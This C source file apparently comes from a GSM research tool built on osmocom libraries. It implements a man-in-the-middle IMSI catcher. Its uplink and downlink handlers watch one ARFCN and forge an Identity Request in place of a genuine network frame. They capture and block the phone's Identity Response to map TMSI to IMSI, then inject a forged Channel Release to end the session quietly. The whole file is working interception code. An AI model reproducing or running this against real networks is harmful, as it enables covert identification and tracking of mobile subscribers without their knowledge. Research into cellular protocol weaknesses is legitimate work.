#include <stdio.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <talloc.h>


#include <osmocom/core/gsmtap.h>
#include <osmocom/core/utils.h>
#include <osmocom/gsm/protocol/gsm_04_08.h>
#include <osmocom/gsm/gsm48.h>
#include <osmocom/gsm/rsl.h>
#include <osmocom/core/gsmtap_util.h>
#include <osmocom/core/linuxlist.h>
#include <osmocom/gsm/lapd_core.h>
#include <osmocom/gsm/lapdm.h>

#include <virtphy/common_util.h>
#include <mitm/lapdm_util.h>
#include <mitm/coder.h>
#include <mitm/osmo_mitm.h>
#include <mitm/l1_util.h>
#include <mitm/subscriber_mapping.h>

enum mitm_state {
	STATE_IMSI_CATCHER_SABM = 0, // we need to get the target imsi - tmsi mapping before we can go on with the attack. Basically we are an imsi catcher in this state.
	STATE_IMSI_CATCHER_I_TO_ID_REQ, // we manipulate the next information frame from the network to a fake identity request. So we do not have to implement a scheduler in the mitm.
	STATE_IMSI_CATCHER_IDENTITY_RESPONSE, // we get the requested identity from the response and block it
	STATE_IMSI_CATCHER_I_TO_CHAN_REL, // we manipulate the next information frame from the network to a channel release msg
};

const struct value_string vs_mitm_states[] = {
        {STATE_IMSI_CATCHER_SABM, "Wait for Sabm"},
        {STATE_IMSI_CATCHER_I_TO_ID_REQ, "I Frame to Identity Request"},
        {STATE_IMSI_CATCHER_IDENTITY_RESPONSE, "Wait for Identity Response"},
        {STATE_IMSI_CATCHER_I_TO_CHAN_REL, "I Frame to Channel Release"},
};

struct pending_identity_request {
	uint8_t mi_type; // @see Table 10.5.4 in TS 04.08
	struct map_imsi_tmsi * subscriber;
	struct chan_desc chan;
	uint8_t max_count;
	uint8_t request_lapd_hdr[3];
	uint8_t response_lapd_hdr[3];
};

static uint32_t intercept_arfcn = 666;
static enum mitm_state mitm_state = STATE_IMSI_CATCHER_SABM;
static struct pending_identity_request pending_identity_req;
int dump_msgs = 0;

void handle_suboptions(int argc, char **argv)
{
	while (1) {
		int option_index = 0, c;
		static struct option long_options[] = {
		        {"dump-msgs", no_argument, &dump_msgs, 1},
		        {0, 0, 0, 0},
		};

		c = getopt_long(argc, argv, "", long_options,
		                &option_index);
		if (c == -1)
			break;

		switch (c) {
		default:
			break;
		}
	}
}

struct msgb *downlink_rcv_cb_handler(struct msgb *msg)
{
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr = NULL;
	struct gsm48_hdr *l3_hdr = NULL;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	struct msgb *manip_msg = NULL;
	uint8_t nr, ns; // lapdm received nr and sent nr
	uint8_t old_state = mitm_state;
	char description[100] = "";

	// simply forward downlink messages we do not want to intercept
	if (intercept_arfcn != arfcn) {
		goto forward_msg;
	}

	// forward all msgs not on a dedicated channel
	if (gsmtap_chantype != GSMTAP_CHANNEL_SDCCH4 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_SDCCH8 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_TCH_F) {
		goto forward_msg;
	}

	// preparate msg data
	chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
	chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
	msg->l2h = msgb_pull(msg, sizeof(*gh));
	l2_hdr = msgb_l2(msg);
	if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_MS, &mctx,
			  &lctx)) {
		// Error might occur if lapdm header is invalid, encoded or enciphered
		fprintf(stderr, "Frame number %d: Error parsing lapd context...\n",
		       gh->frame_number);
		goto push_hdr;
	}
	l3_hdr = msgb_l3(msg);
	// l1h and l2h need to be reassigned as they are reset by pull_lapdm_ctx
	msg->l2h = (unsigned char *) l2_hdr;
	msg->l1h = (unsigned char *) gh;

	switch (mitm_state) {
	case STATE_IMSI_CATCHER_I_TO_ID_REQ:
		// check if we have an I Frame to manipulate
		if(LAPDm_CTRL_is_I(l2_hdr[1]) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + (sizeof(*gh) * 8), "id_req");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			memcpy(manip_msg->l2h, l2_hdr, 3);
			lapdm_set_length((uint8_t *)manip_msg->l2h, 3, 0, 1);
			memcpy(pending_identity_req.request_lapd_hdr, manip_msg->l2h, 3);
			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_MM;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_MM_ID_REQ;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = pending_identity_req.mi_type;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_IDENTITY_RESPONSE;
			sprintf(description, "Modified msg on downlink to identity request!");
		}
		break;
	case STATE_IMSI_CATCHER_I_TO_CHAN_REL:
		// check if we have an I or U Frame to manipulate
		if((LAPDm_CTRL_is_I(l2_hdr[1]) || LAPDm_CTRL_is_U(l2_hdr[1])) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + sizeof(*gh) * 8, "chan_rel");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			// reuse l2 hdr of identity request
			memcpy(manip_msg->l2h, pending_identity_req.request_lapd_hdr, 3);
			ns = LAPDm_CTRL_Nr(pending_identity_req.response_lapd_hdr[1]); // set ns to fit with expected nr from ms
			nr = LAPDm_CTRL_Nr(pending_identity_req.request_lapd_hdr[1]) + 1 ; // increment nr from identity request
			// protocol id for I Frame i 0
			// correct the I Frames rec nr and sent nr
			manip_msg->l2h[1] = LAPDm_CTRL_I(nr, ns, 0);

			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_RR;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_RR_CHAN_REL;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = GSM48_RR_CAUSE_NORMAL;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_SABM;
			sprintf(description, "Modified msg on downlink to channel release request!");
		}
		break;
	default:
		break;
	}

push_hdr:
	// push all the bits that have been pulled before so that we have the gsmtap header at the front again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

forward_msg:
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, manip_msg, dump_msgs, description);
	// Forward msg to downlink
	if(manip_msg != NULL) {
		msgb_free(msg);
		return manip_msg;
	}
	return msg;
}

struct msgb* uplink_rcv_cb_handler(struct msgb *msg)
{
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr = NULL;
	struct gsm48_hdr *l3_hdr = NULL;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	memset(&mctx, 0, sizeof(mctx));
	memset(&lctx, 0, sizeof(lctx));
	uint8_t old_state = mitm_state;
	char description[100] = "";

	// simply forward uplink messages we do not want to intercept
	if ((intercept_arfcn | GSMTAP_ARFCN_F_UPLINK) != arfcn) {
		goto forward_msg;
	}

	// forward all msgs not on a dedicated channel
	if (gsmtap_chantype != GSMTAP_CHANNEL_SDCCH4 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_SDCCH8 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_TCH_F) {
		goto forward_msg;
	}

	// preparate msg data
	chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
	chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
	msg->l2h = msgb_pull(msg, sizeof(*gh));
	l2_hdr = msgb_l2(msg);
	if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
			  &lctx)) {
		// Error might occur if lapdm header is invalid, encoded or enciphered
		fprintf(stderr, "Frame number %d: Error parsing lapd context...\n",
		       gh->frame_number);
		goto push_hdr;
	}
	l3_hdr = msgb_l3(msg);
	// l1h and l2h need to be reassigned as they are reset by pull_lapdm_ctx
	msg->l2h = (unsigned char *) l2_hdr;
	msg->l1h = (unsigned char *) gh;

	switch(mitm_state) {
	case STATE_IMSI_CATCHER_SABM:
		// check if we have a unnumbered frame of type SABM
		if(LAPDm_CTRL_is_U(l2_hdr[1]) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {
			struct map_imsi_tmsi *subscriber = NULL;

			// check if we have a MM CM service request
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_REQ) {
				struct gsm48_service_request *sreq = (struct gsm48_service_request *) l3_hdr->data;
				subscriber = add_subscriber(sreq->mi, sreq->mi_len);
			}
			// check if we have a MM CM service request
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_LOC_UPD_REQUEST) {
				struct gsm48_loc_upd_req *lureq = (struct gsm48_loc_upd_req *) l3_hdr->data;
				subscriber = add_subscriber(lureq->mi, lureq->mi_len);
			}

			// we only need to start id req routine if we do not have a mapping already
			if(subscriber != NULL && strcmp(subscriber->imsi, "") == 0) {
				pending_identity_req.subscriber = subscriber;
				pending_identity_req.mi_type = GSM_MI_TYPE_IMSI;
				pending_identity_req.max_count = 3;
				set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);

				// start imsi catcher routine
				mitm_state = STATE_IMSI_CATCHER_I_TO_ID_REQ;
				sprintf(description, "CM Service | Location update request with unmapped tmsi (%x)", subscriber->tmsi);
			}
		}
		break;
	case STATE_IMSI_CATCHER_IDENTITY_RESPONSE:
		if(is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			if(--pending_identity_req.max_count == 0) {
				mitm_state = STATE_IMSI_CATCHER_SABM;
				sprintf(description, "No identity response detected within max msg count...");
			}
			// check if we have an I Frame - MM Identity Response
			if(LAPDm_CTRL_is_I(l2_hdr[1]) &&
			   gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_ID_RESP) {
				uint8_t mi_len = l3_hdr->data[0]; // mobile identity length
				uint8_t* mi = &l3_hdr->data[1]; // mobile identity
				uint8_t mi_type = get_mi_type(mi);

				// check if we have a response to our identity request
				if(pending_identity_req.mi_type == mi_type) {
					memcpy(pending_identity_req.response_lapd_hdr, l2_hdr, 3);
					update_subscriber(pending_identity_req.subscriber, mi, mi_len);
					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
					sprintf(description, "Catched and blocked identity response (%s)! Updated subscriber (imsi=%s, tmsi=%u)!", mi_type == GSM_MI_TYPE_IMSI ? "imsi" : "tmsi", pending_identity_req.subscriber->imsi, pending_identity_req.subscriber->tmsi);
					// we don't forward the id req
					goto block_msg;
				}
			}
		}
		break;
	default:
		break;
	}
push_hdr:
	// push all the bits that have been pulled before so that we have the gsmtap header at the front again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

forward_msg:
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, NULL, dump_msgs, description);
	// Forward msg to downlink
	return msg;

block_msg:
	// need to push for logging
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, NULL, dump_msgs, description);
	msgb_free(msg);
	// Forward msg to downlink
	return NULL;
}
